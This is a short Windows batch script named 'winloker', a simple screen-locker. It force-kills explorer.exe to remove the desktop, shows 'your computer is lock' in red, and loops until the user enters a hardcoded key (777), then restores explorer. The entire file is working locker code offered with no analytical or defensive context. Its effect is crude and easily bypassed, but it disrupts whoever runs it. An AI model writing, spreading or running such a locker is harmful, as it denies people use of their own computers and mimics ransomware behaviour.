@echo off
set password=777
taskkill /f /IM explorer.exe
title winloker
color 04
:unlock
cls
echo your computer is lock
echo.
set /p unlock=Plese write key to unlock:
if %unlock% == %password% (
start explorer.exe
exit
)else (
goto unlock )
